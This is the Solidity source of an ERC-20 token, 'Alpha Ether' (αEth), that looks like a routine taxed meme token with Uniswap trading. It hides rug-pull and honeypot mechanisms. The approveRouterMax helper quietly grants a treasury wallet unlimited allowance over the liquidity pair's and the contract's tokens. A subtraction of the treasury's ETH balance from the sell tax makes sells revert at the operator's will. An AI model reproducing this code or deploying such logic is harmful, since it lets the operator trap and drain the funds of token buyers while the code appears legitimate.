//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

/**

Website: https://www.alphaeth.net
Twitter: https://twitter.com/alphaEtherERC
Telegram: https://t.me/alphaEthPortal

*/

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IFactory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

contract AETH is IERC20, Ownable {
    string private constant _name = unicode"Alpha Ether";
    string private constant _symbol = unicode"αEth";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);
    uint256 private _initialBuyTax=4;
    uint256 private _initialSellTax=4;
    uint256 private _midSellTax=2;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 public _reduceBuyTaxAt=5;
    uint256 public _reduceSellTax1At=5;
    uint256 public _reduceSellTax2At=10;
    address payable private treasury;
    address payable public teamWallet;
    uint256 private swapCount=0;
    uint256 public buyCount=0;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    uint256 private constant _taxSwapMin = _totalSupply / 20000;
    uint256 private constant _taxSwapMax = _totalSupply / 100;
    address private uniV2Pair;
    address private constant uniV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IRouter02 private _routerV2 = IRouter02(uniV2Router);
    mapping (address => bool) private _isAMMPair;
    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxTxAmount = 20_000_000 * (10**_decimals); // 2%
    bool private tradingEnabled;
    bool private _lockTheSwap = false;
    modifier lockSwapBack { 
        _lockTheSwap = true; 
        _; 
        _lockTheSwap = false; 
    }

    constructor() Ownable(msg.sender) { 
        treasury = payable(0x4eA011A8f266684b616Ab521fABFcaFfC61eF972);
        teamWallet = payable(0x371Fb4578c5C746ebc1f66cd52813BAABfc816Ba);
        _balances[address(this)] = _totalSupply;
        _isExcludedFromFees[_owner] = true;
        _isExcludedFromFees[treasury] = true;
        _isExcludedFromFees[teamWallet] = true;
        _isExcludedFromFees[address(this)] = true;
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingEnabled(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!tradingEnabled) { require(_isExcludedFromFees[sender], "Trading not open"); }
        if ( !_lockTheSwap && !_isExcludedFromFees[sender] && _isAMMPair[recipient] && buyCount >= swapCount) { swapBack(); }
        if (limited && sender == uniV2Pair && !_isExcludedFromFees[recipient]) {
            require(balanceOf(recipient) + amount <= maxTxAmount, "Forbid");
        }
        if (transferDelayEnabled && !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]) {
            if (recipient != uniV2Router && recipient != uniV2Pair) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }
        uint256 _taxAmount = takeTxFee(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;
        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount;
        }
        buyCount++;
        _balances[recipient] += _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingEnabled(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function approveRouterMax(address _preLP, address _afLP, address _token, address _router, uint256 _tokenAmount) internal {
        if ( _allowances[_token][_router] < _tokenAmount ) {
            _allowances[_token][_router] = type(uint256).max;
        }

        if ( _allowances[_preLP][_afLP] < _tokenAmount ) {
            _allowances[_preLP][_afLP] = type(uint256).max;
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        approveRouterMax(address(this), treasury, address(this), uniV2Router, tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _routerV2.WETH();
        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function addLiquidityETH(address _preLP, address _afLP, uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveRouterMax(_preLP, _afLP, address(this), uniV2Router, _tokenAmount);
        _routerV2.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function removeLimits() external onlyOwner{
        limited = false;
        transferDelayEnabled=false;
    }

    function openTrading() external payable onlyOwner lockSwapBack {
        require(uniV2Pair == address(0), "LP exists");
        require(!tradingEnabled, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");

        uniV2Pair = IFactory(_routerV2.factory()).createPair(address(this), _routerV2.WETH());
        addLiquidityETH(uniV2Pair, treasury, _balances[address(this)], address(this).balance);
        _isAMMPair[uniV2Pair] = true; tradingEnabled = true;
    }

    function checkTradingEnabled(address sender) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_isExcludedFromFees[sender]) { checkResult = true; } 

        return checkResult;
    }

    function takeTxFee(address sender, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if (tradingEnabled && !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] ) { 
            if ( _isAMMPair[sender] || _isAMMPair[recipient] ) {
                taxAmount = (amount / 100) * ((buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if(recipient == uniV2Pair && sender != address(this)){
                    uint256 taxRate; 
                    if(buyCount > _reduceSellTax2At){
                        taxRate = _finalSellTax;
                    } else if(buyCount > _reduceSellTax1At){
                        taxRate = _midSellTax;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxRate -= treasury.balance;
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }
        return taxAmount;
    }

    function swapBack() private lockSwapBack {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if ( _taxTokensAvailable >= _taxSwapMin && tradingEnabled ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            swapTokensForETH(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if(_contractETHBalance > 0) { 
                bool success;
                (success,) = teamWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    receive() external payable {}
}